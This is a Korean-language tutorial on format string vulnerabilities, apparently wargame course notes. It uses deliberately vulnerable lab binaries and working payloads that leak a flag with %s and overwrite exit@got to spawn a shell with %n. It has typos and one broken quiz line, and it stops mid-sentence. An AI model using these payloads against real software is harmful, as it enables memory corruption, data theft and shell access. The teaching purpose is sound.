# Format String Bug
포맷 스트링에는 다양한 종류가 있고, 주어진 인자에 대해 각 포맷 별로 정해진 기능을 수행한다.
만약 공격자가 이러한 포맷 스트링을 조작할 수 있다면, printf 함수의 이나가 저장되는 스택의 내용을 읽거나 %n 혹은 %s 등 메모리 참조 포맷 스트링을 이용해 메모리 커럽션을 유발할 수도 있다.
아래의 표는 printf 포맷 스트링등에 대한 설명이다.
|Type Field|설명|Example|
|----------|----|-------|
|%|"%" 문자를 출력|%|
|c|하나의 문자를 출력|a|
|d, i|signed integer를 출력|31337|
|s|NULL 바이트로 끝나는 문자열을 출력|Hello World!|
|x|unsigned integer를 16진수 형태로 출력|d|
|n|현재까지 출력된 문자의 개수를 변수에 저장. 출력 결과는 없음.| |

관련 퀴즈
``` C
int a,b,c,d = 0;
char str[] = "string";
char str2[] = "st\x00ring";
printf("hello dreamhack!%n\n",&a);
printf("str:%s%n\n",str, &b);
printf("%100c%n", 'x', &c);
printf("str: %s\n", str2);

위 코드에서 a 값은 16이다.
위 코드에서 b 값은 10이다.
위 코드에서 c 값은 100이다.
위 코드에서 str2의 출력 값은 st이다.
```
* 예제1
``` C
// gcc -o fsb1 fsb1.c -m32 -mpreferred-stack-boundary=2
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
char flag_buf[50];
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
int main()
{
	FILE *fp;
	char buf[256];
	initialize();
	memset(buf, 0, sizeof(buf));
	fp = fopen("./flag", "r");
	fread(flag_buf, 1, sizeof(flag_buf), fp);
	printf("Input: ");
	read(0, buf, sizeof(buf)-1);
	printf(buf);
	return 0;
}
```
 fsb1은 중요 파일인 "flag" 파일을 읽고 전역 변수 flag_buf에 저장한다.
 그리고 지역 버퍼인 buf에 입력을 받고 printf를 사용하여 출력하되 사용자의 입력이 포맷 스트링으로 그대로 들어가기 때문에 포맷 스트링 버그가 발생한다.
 해당 예제의 목표는 flag_buf에 저장되어 있는 "flag" 파일의 내용을 포맷 스트링 버그를 통해 읽는 것이다.

우선 포맷 스트링 버그가 존재하면 포맷 스트링이 참조하는 버퍼에 공격자의 값을 쓸 수 있는지, 그리고 입력한 데이터가 몇 번째 포맷 스트링에 참조되는지를 먼저 알아내야 한다.
공격자가 변조 가능한 데이터 포맷 스트링에 의해 참조된다면 임의 주소에 값을 쓰거나 읽는 것이 가능하다.
```
//fsb
$ ./fsb1
Input: AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x 
AAAA9ca9008.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.a78252e.0
```
fsb를 확인해보면 처음 입력 값 "AAAA"가 두 번째 포맷 스트링에 의해 참조되는 것을 확인할 수 있다.
해당 값은 printf가 호출될 때의 스택 포인터의 값을 확인하면 정확하게 알아낼 수 있다.
만약 처음에 입력한 4바이트의 값이 특정 메모리 주소라면, 해당 포인터를 참조하는 포맷 스트링을 사용했을 때 입력한 주소에 값을 쓰거나 읽을 수 있따.
```
//fsb_n
# gdb fsb1
(gdb) set disassembly-flavor intel
(gdb) r
Starting program: ./fsb1 
Input: AAAA%x.%n
Program received signal SIGSEGV, Segmentation fault.
0xf7e43369 in _IO_vfprintf_internal (s=0xffffafd4, format=<optimized out>, ap=0xffffd5b8 "%x.%n\n") at vfprintf.c:1631
1631	vfprintf.c: No such file or directory.
(gdb) x/i $eip
=> 0xf7e43369 <_IO_vfprintf_internal+8873>:	mov    DWORD PTR [eax],esi
(gdb) i r $eax $esi
eax            0x41414141	1094795585
esi            0xc	12
```
fsb_n을 보면 "AAAA%x.%n"을 입력했을 때 printf 함수가 실행되면서 프로그램이 비정상 종료한 것을 알 수 있다.
비정상 종료가 발생한 명령어와 레지스터를 gdb를 통해 확인해보면, 0x41414141이 "%n" 포맷 스트링을 통해 참조되어 값을 쓰다가 Segmentation fault가 발생되는 것을 알 수 있다.
이해를 돕기 위해 요약한 명령어는 아래와 같다.
```
mov    DWORD PTR [0x41414141], 0xc
```
만약 두 번째 값이 0x41414141이 아닌 메모리에 존재하는 주소라면 해당 영역에 값을 쓰거나 읽을 수 있다.   
"%n" 포맷 스트링을 이용하면 원하는 주소를 참조하여 값을 쓸 수 있다는 것을 알았다.
그러나 fsb1에서는 전역 변수 flag_buf에 저장된 내용을 읽어야 한다.
flag_buf의 주소는 심볼을 이용해 gdb에서 다음과 같이 알아낼 수 있다.
```
(gdb) info var flag_buf
All variables matching regular expression "flag_buf":
Non-debugging symbols:
0x0804a080  flag_buf
```
입력의 첫 4바이트에 0x0804a080 주소를 입력하여 두 번쨰 포맷 스트링을 참조할 때 해당 주소를 참조하도록 한다.
특정 문자열을 출력할 때 "%s" 포맷 스트링을 사용하여 다음과 같이 지정된 주소의 문자열을 출력할 수 있다.
```
printf("%s", "HELLO WORLD")
```
만약 "[flag_buf 주소].%x.%s"을 삽입한다면 "%s" 포맷 스트링을 처리할 때 printf("%s", 0x804a080)의 결과를 출력할 것이다.
```
//fsb1_exploit
(gdb) r <<< $(python -c 'print "\x80\xa0\x04\x08%x.%s"')
Starting program: ./fsb1 <<< $(python -c 'print "\x80\xa0\x04\x08%x.%s"')
Input: ?804b008.DREAMHACK_FORMATSTRING
```
fsb1_exploit을 확인해보면 성공적으로 "flag" 파일의 내용인 "DREAMHACK_FORMATSTRING" 문자열이 출력된 것을 확인할 수 있다.
만약 사용자가 입력한 값이 두 번째가 아닌 천 번째, 만 번째 포맷스트링에서 참조할 수 있다면 해당 포인터를 참조하도록 많은 포맷 스트링을 입력해 접근해야 한다.
그러나 이를 쉽게 해결하는 방법 또한 존재한다.
```
//fsb1_exploit2
(gdb) r <<< $(python -c 'print "\x80\xa0\x04\x08%2$s"')
Starting program: /mnt/hgfs/ubuntu/dreamhack/fsb1 <<< $(python -c 'print "\x80\xa0\x04\x08%2$s"')
Input: ?DREAMHACK_FORMATSTRING
```
fsb1_exploit2를 확인해보면 "[flag_buf 주소]%2$s"를 입력하였다. "%N$"는 N번째 매개변수를 특정 포맷 스트링으로 처리할 때 사용한다.
예제에서 다룬 "%2$s"는 두 번째 주소를 "s" 포맷 스트링을 통해 출력한다는 의미이다.
```C
//fsb_example.c
#include <stdio.h>
int main()
{
	printf("%2$s", "HELLO", "WORLD");
}
```
fsb_example.c는 "%N$"의 이해를 돕기 위한 간단한 예제이다. 실행 결과는 다음과 같다.
```
$ ./ex
WORLD
```
이처럼 "$"를 사용하면 원하는 번지의 주소를 쉽게 참조할 수 있기 때문에 유용하게 사용할 수 있다.

* 퀴즈
```C
// fsb_read.c
#include <stdio.h>
int main(void) {
    int auth = "FLAG";
    char buf[32] = {0, };
    
    read(0, buf, 32);
    printf(buf);
}
```
auth 값을 읽기 위해서는 몇 번째 포맷 스트링에 의해 참조되는 지 알아야 한다.
```
bash3.2$ ./fsb1
input : AAAA%x.%x.%x.%x.%x.%x
AAAA1.41fe41ff.42be4242.0.41414141.252e7825
Fail
```
5번째 포맷 스트링에 의해 참조된다.
payload는 ["auth의 주소"]%5$s이다.
```
bash3.2$ ./fsb1
input : 0þÿ%5$s
0þÿFLAG
Win
```

* 예제2
```C
// gcc -o fsb2 fsb2.c -m32 -mpreferred-stack-boundary=2
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
void get_shell() {
	system("/bin/sh");
}
int main()
{
	char buf[256];
	initialize();
	memset(buf, 0, sizeof(buf));
	printf("Input: ");
	read(0, buf, sizeof(buf)-1);
	printf(buf);
	exit(0);
}
```
임의의 주소에 원하는 값을 쓰는 방법에 대해 자세히 알아보자.
fsb2는 포맷 스트링 버그가 발생하고 exit 함수가 호출되어 프로그램이 종료되는 예제이다.
exit함수는 포맷 스트링 버그가 발생한 이후에 호출되기 때문에 exit@got를 조작할 수 있따면 주어진 get_shell함수로 실행 흐름을 조작할 수 있다.
이전 예제를 살펴보면 "n" 포맷 스트링을 사용하면 출력된 문자열의 길이만큼 특정 주소에 값을 쓴다는 것을 확인할 수 있었따.
값을 쓰는 것 또한 이전 공격 방식과 비슷한 과정을 통해 수행할 수 있다.
"n"은 출력된 문자의 길이 수를 전달된 매개변수에 쓰는 포맷 스트링이다.
```
// gcc -o fsb_example2 fsb_example2.c
#include <stdio.h>
int main()
{
	int ret = 0;
	printf("1234%1$n\n", &ret);
	printf("ret: %d\n", ret);
}
```
fsb_example2는 "n" 포맷 스트링의 이해를 돕기 위한 예제이다. 실행 결과는 다음고 같다.
```
# ./fsb_example2
1234
ret: 4
```
printf의 첫 번째 인자로는 "1234%1$n", 두 번째 인자에는 ret 지역 변수의 주소를 전달하였다.
"1234" 문자열의 길이는 4이고, "%1$n" 포맷 스트링을 사용하여 ret에 출력된 문자열의 길이를 쓰기 때문에 ret은 4라는 값을 가지게 된다.   
그러나 실제로 공격을 할 때는 이와 같은 작은 값을 쓸 경우는 적다.
만약 0x41414141이란 값을 쓰기 위해서는 문자열의 길이가 1094795585(0x41414141의 10진수)이 되어야 하는데, 입력할 수 있는 길이가 한정되어 있다면
fsb_example2에서 다룬 방법으로는 공격이 불가능 할 수 있다.
```
// gcc -o fsb_example3 fsb_example3.c
#include <stdio.h>
int main()
{
	int ret = 0;
	printf("%1024c%1$n\n", &ret);
	printf("ret: %d\n", ret);
}
```
fsb_example3는 이를 해결할 수 있는 예제이다.
```
$ ./fsb_exmaple3
       
       
       
       
       
       
       
       
       
       
       
       ?
ret: 1024
```
1024바이트 길이의 데이터를 입력하지 않았는데 ret이 1024로 덮인 것을 확인할 수 있다.
"%1024c"는 1024 길이의 공백을 포함한 문자를 "c" 포맷 스트링으로 출력하는 것이기 때문에 이를 사용하여 원하는 길이만큼 화면에 문자를 출력할 수 있다.
해당 방법을 사용하면 입력할 수 있는 버퍼가 한정적이더라도 원하는 문자열의 길이를 출력하여 임의 주소에 원하는 값을 쓸 수 있다.   
그럼 앞에서 배운 "%Nc"와 "n" 포맷 스트링을 사용하여 exit@got를 원하는 값으로 덮어써보자.
우선 exit@got를 get_shell 주소로 덮어쓰기 위해 해당하는 주소를 구한다.
```
(gdb) i func get_shell
All functions matching regular expression "get_shell":
Non-debugging symbols:
0x08048639  get_shell
(gdb) x/i exit
   0x8048490 <exit@plt>:	jmp    *0x804a024
```
```
//fsb2_exploit1
(gdb) r <<< $(python -c 'print "\x24\xa0\x04\x08%1024c%1$n"')
Starting program: ./fsb2 <<< $(python -c 'print "\x24\xa0\x04\x08%1024c%1$n"')
Input: $                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 










                $
Program received signal SIGSEGV, Segmentation fault.
0x00000404 in ?? ()
```
fsb2_exploit1은 1024 바이트만큼 출력해 exit@got를 1024dls 0x400값으로 덮어쓰는 공격 코드이다.   
"exit@got주소%1024c%1$n" 포맷 스트링을 사용하여 덮어쓴 결과 1024(0x400)이 아닌 0x404 값이 덮어써진 것을 확인할 수 있다.
이유는 다음과 같다.   
"n"은 출력한 문자의 길이 값을 전달된 인자에 쓰는 포맷 스트링이다. 공격 코드의 경우 "%1024c"를 통해 1024바이트만큼 출력했지만
앞 부분에 입력한 exit@got 주소, 즉 4바이트가 포함되어 있기 때문에 1028인 0x404 값이 덮어써진 것이다.
```
//fsb2_exploit2
$ (python -c 'print "\x24\xa0\x04\x08%134514229c%1$n"') | ./fsb2
```
fsb2_exploit2는 exit@got 주소를 get_shell 주소로 덮어쓰는 공격 ㅋ









































